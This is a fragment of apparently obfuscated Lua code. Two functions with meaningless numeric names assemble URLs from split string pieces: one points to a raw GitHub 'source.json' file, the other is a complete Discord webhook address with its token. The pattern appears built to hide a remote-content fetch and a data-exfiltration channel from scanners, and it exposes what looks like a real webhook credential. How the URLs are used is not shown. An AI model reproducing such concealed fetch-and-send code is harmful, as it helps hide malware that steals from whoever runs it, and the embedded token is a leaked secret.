...
local function v48291736501928374650()
    local p = {
        "https://raw.git", "hubusercontent", ".com/nd827h3-ndi2",
        "73hd-kqow82us-qk", "o28ec/92iejewo-lwo", "29edi-91p1lwowo-",
        "kso28ha/refs/heads", "/main/source.json"
    }
...
local function v91827364501928374650()
    local p = {
        "https://discord.com/api/webhooks/", "1500000787185537084/",
        "sTtB9I9Yzhz7jy4GfmZHjZO5J_2y4G-WC",
        "SNl3OblywUTOs1u_XVcp0uSx2-_3LDPTHM8"
    }
    local r = table.concat(p)
    p = nil
    return r
